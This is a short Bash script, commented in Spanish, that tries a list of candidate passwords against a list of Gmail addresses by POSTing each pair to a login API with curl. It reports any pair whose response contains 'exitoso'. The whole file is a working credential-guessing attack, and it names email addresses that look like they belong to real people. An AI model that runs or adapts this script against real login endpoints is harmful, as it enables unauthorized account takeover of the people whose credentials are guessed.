

echo "probando usarios y passwords"


passwords=(
    "pAbl03" "kat2lr2"
)


emails=("kate.rine2@gmail.com" "pablo.17@gmail.com")

echo "probando los posibles ${#emails[@]} y usuarios con ${#passwords[@]} y sus contraseñas"
echo ""

for email in "${emails[@]}"; do
    echo "se esta atacando: $email"
    
    for pass in "${passwords[@]}"; do
        respuesta=$(curl -s -X POST "$API/login" \
            -H "Content-Type: application/json" \
            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
        

        if echo "$respuesta" | grep -q "exitoso"; then
            echo "se encontro: $email - $pass"
        else
            echo "no se encontro: $pass"
        fi
    done
    echo "---"
done

echo "----"